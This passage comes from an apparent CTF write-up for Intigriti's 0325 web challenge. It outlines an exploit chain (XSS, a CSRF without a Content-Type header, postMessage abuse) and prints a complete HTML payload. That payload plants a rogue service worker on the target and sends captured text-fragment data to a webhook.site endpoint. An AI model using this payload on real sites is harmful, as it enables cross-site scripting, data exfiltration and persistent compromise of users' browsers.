+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">opener</span>.<span style="color:#a6e22e">postMessage</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;success&#34;</span>, <span style="color:#a6e22e">noteId</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">foundNote</span>.<span style="color:#a6e22e">id</span> }, <span style="color:#e6db74">&#34;*&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setIsSuccess</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">opener</span>.<span style="color:#a6e22e">postMessage</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;error&#34;</span> }, <span style="color:#e6db74">&#34;*&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setIsSuccess</span>(<span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>To ensure the notes are loaded into <code>localStorage</code>, we simply open a new window to <code>/notes</code>.</p>
+
+<h2 id="putting-it-all-together">
+  <a class="full-clickable-heading" href="#putting-it-all-together">
+    Putting it all together
+  </a>
+</h2>
+<p>The exploit proceeds as follows:</p>
+<ul>
+<li>Build an XSS payload  that registers a service worker, as described above.</li>
+<li>CSRF (without a <code>Content-Type</code> header) using our XSS payload inside an array.</li>
+<li>Execute <code>window.open(&quot;/notes&quot;)</code> to load the freshly created note into <code>localStorage</code>.</li>
+<li>Add an event listener for <code>postMessage</code> to capture the ID of the created note.</li>
+<li>Execute <code>window.open(&quot;/protected-note&quot;)</code> and send a message with data <code>{ type: &quot;submitPassword&quot;, password: &quot;&quot; }</code>.</li>
+<li>Receive the <code>postMessage</code> response</li>
+<li>Navigate to <code>/note/&lt;note-id&gt;</code> to trigger the XSS</li>
+<li>Profit</li>
+</ul>
+<p>If everything is executed correctly, this method will work in both Firefox and Chrome, and we will receive a request to our webhook containing the flag.</p>
+
+<h3 id="final-payload">
+  <a class="full-clickable-heading" href="#final-payload">
+    Final payload
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Document&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">h1</span>&gt;Hi&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">p</span>&gt;Click anywhere to start&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">TARGET</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://challenge-0325.intigriti.io&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">WEBHOOK</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">WIN</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, (<span style="color:#a6e22e">event</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;success&#34;</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Success&#34;</span>, <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">WIN</span>.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>                window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">TARGET</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/note/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">noteId</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">done = false;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">let urlParams = new URLSearchParams(window.location.search);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(async () =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    if(!(await navigator.serviceWorker.getRegistration())) return;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    window.stop();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    if(!urlParams.get(&#34;done&#34;)){
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        window.stop()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">setTimeout(() =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        window.location = location.origin + location.pathname + &#34;?done=1&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }, 2000)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }else{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        window.stop()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    setTimeout(() =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        window.location.reload()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }, 2000)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">})();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(async () =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    a = await navigator.serviceWorker.register(&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">TARGET</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/view_protected_note.js?id=../api/a-3f42-4b86-ae89-/../track///&#39;, {updateViaCache: &#39;all&#39;});
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    await fetch(&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">TARGET</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/view_protected_note.js?id=../api/a-3f42-4b86-ae89-/../track///&#39;, {headers: {&#39;x-user-ip&#39;: &#34;\\&#34;}});function $(_){return {ready:(_)=&gt;{}}};function document(){};document.ready=function(_){};function searchTextFragment(e,t=&#39;root&#39;,n=new Set){if(!n.has(e)){n.add(e);for(const c in e)try{const a=e[c];&#39;string&#39;==typeof a&amp;&amp;a.includes(&#39;:~:&#39;)?fetch(&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">WEBHOOK</span><span style="color:#e6db74">}</span><span style="color:#e6db74">?data=&#39;+encodeURIComponent(a)):a&amp;&amp;&#39;object&#39;==typeof a&amp;&amp;searchTextFragment(a,t,n)}catch(e){}}}self.addEventListener(&#39;fetch&#39;,(e=&gt;{searchTextFragment(e),e.clientId&amp;&amp;self.clients.get(e.clientId).then((e=&gt;{e&amp;&amp;searchTextFragment(e)}))}));(function a(){b={//&#34;}, cache: &#39;reload&#39;});
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    a.update()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    setTimeout(() =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        window.location = location.origin + location.pathname;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }, 5000)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">})()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;\/script&gt;`</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">TARGET</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/api/post`</span>, {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Blob</span>([
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#e6db74">&#34;title&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`Hello World`</span>, <span style="color:#e6db74">&#34;content&#34;</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">payload</span>] })
+</span></span><span style="display:flex;"><span>                    ]),
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;include&#34;</span>
+</span></span><span style="display:flex;"><span>                });
+</span></span><span style="display:flex;"><span>            }<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fetch_note_window</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">TARGET</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/notes`</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;width=512,height=512&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fetch_note_window</span>.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">WIN</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">TARGET</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/protected-note`</span>, <span style="color:#e6db74">&#34;_blank&#34;</span>, <span style="color:#e6db74">&#34;width=600,height=1000&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">WIN</span>.<span style="color:#a6e22e">postMessage</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;submitPassword&#34;</span>, <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span> }, <span style="color:#e6db74">&#34;*&#34;</span>)
+</span></span><span style="display:flex;"><span>                }, <span style="color:#ae81ff">500</span>)
+</span></span><span style="display:flex;"><span>            }, <span style="color:#ae81ff">500</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;click&#34;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">main</span>();
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div>
+<h2 id="conclusion">
+  <a class="full-clickable-heading" href="#conclusion">
+    Conclusion
+  </a>
+</h2>
+<p>I truly enjoyed piecing together every part of the puzzle to solve this challenge. Thanks a lot to <a href="https://x.com/_0x999">0x999</a> for creating such a unique challenge.</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API">https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div></div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/salvatore-abello">Github</a>
+      
+         | 
+        <a href="https://www.linkedin.com/in/salvatore-abello-411b64252/">Linkedin</a>
+      
+         | 
+        <a href="https://x.com/salvatoreabello">X</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright 2025. All rights reserved.
+    <hr />
+    <code>Made with ❤️ by <strong>Salvatore Abello</strong></code>.
+  </p>
+</footer>
+
+    </div>
+  </body>
+</html>
